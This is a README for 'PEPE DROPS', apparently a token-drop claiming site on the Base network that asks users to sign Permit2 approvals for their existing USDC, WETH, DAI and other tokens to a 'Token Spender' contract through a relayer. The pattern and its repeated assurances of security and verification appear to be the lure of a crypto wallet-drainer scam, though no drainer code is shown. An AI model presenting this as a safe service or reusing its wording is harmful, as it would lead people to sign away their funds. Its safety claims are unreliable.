# PEPE DROPS - Secure Token Claiming Platform

**Website:** [memebasepepe.com](https://memebasepepe.com)  
**Network:** Base (Chain ID: 8453)

PEPE DROPS is a secure platform for discovering and claiming token drops on Base Network. We leverage industry-standard Permit2 for gasless approvals and all smart contracts are fully verified and open source.

## 🛡️ Security & Verification

All smart contracts used by PEPE DROPS are verified on [BaseScan](https://basescan.org):

| Contract | Address | Status |
|----------|---------|--------|
| **Uniswap Permit2** | `0x000000000022D473030F116dDEE9F6B43aC78BA3` | ✅ Verified |
| **Token Spender** | `0x2eB8cA2f4CCd8e4B069b9F599a740b0BB33Aa684` | ✅ Verified |
| **Proxy Contract** | `VITE_PROXY_CONTRACT` | ✅ Verified |

### Security Features
- **Permit2 Integration**: Uses Uniswap's Permit2 for secure, gasless token approvals
- **No Private Key Access**: We never have access to your private keys or seed phrases
- **Open Source**: All contracts are auditable on BaseScan
- **User-Signed Transactions**: All transactions are signed by you and executed directly on-chain

## 🔗 Official Links

- **Website:** https://memebasepepe.com
- **Twitter/X:** https://x.com/memebasepepe
- **Telegram:** https://t.me/memebasepepe
- **GitHub:** https://github.com/gdverobit593/2343421243824

## ⚡ How It Works

1. **Connect Wallet**: Connect your MetaMask or WalletConnect-compatible wallet to Base Network
2. **Discover Drops**: Browse curated lists of the latest, hottest, and most promising token drops
3. **Secure Claim**: Use Permit2 for gasless token approvals and claim with minimal fees

## 💼 Supported Tokens

PEPE DROPS supports all major Base tokens including:
- USDC, USDbC (Stablecoins)
- WETH, CBETH (ETH variants)
- DAI (Stablecoin)
- BRETT, AERO, DEGEN, ZORA, VIRTUAL, MORPHO, ZRO (Meme/DeFi tokens)
- And more!

## 🏗️ Architecture

### Frontend
- React + TypeScript
- Vite build system
- Tailwind CSS
- RainbowKit for wallet connection
- Wagmi for blockchain interactions

### Backend (Relayer)
- Node.js + Express
- Viem for blockchain interactions
- Permit2 signature verification
- Gasless relay service

### Smart Contracts
All contracts are deployed on Base Network and verified on BaseScan.

## 🔒 Safety Information

**Before interacting with any drop:**
1. Always verify smart contract addresses on BaseScan
2. Never share your private keys or seed phrases
3. Review transaction details before signing
4. Start with small amounts when testing new drops

## 📞 Support

For support, questions, or partnership inquiries:

- **Email:** support@memebasepepe.com
- **Telegram:** https://t.me/memebasepepe
- **Twitter:** https://x.com/memebasepepe

## 🚀 Development

```bash
# Install dependencies
npm install

# Run development server
npm run dev

# Build for production
npm run build

# Start production server
npm run preview
```

## 📜 License

This project is open source. All smart contracts are verified and available for audit on BaseScan.

---

**Note:** This platform aggregates information about legitimate token drops. Always do your own research (DYOR) before interacting with any smart contract.
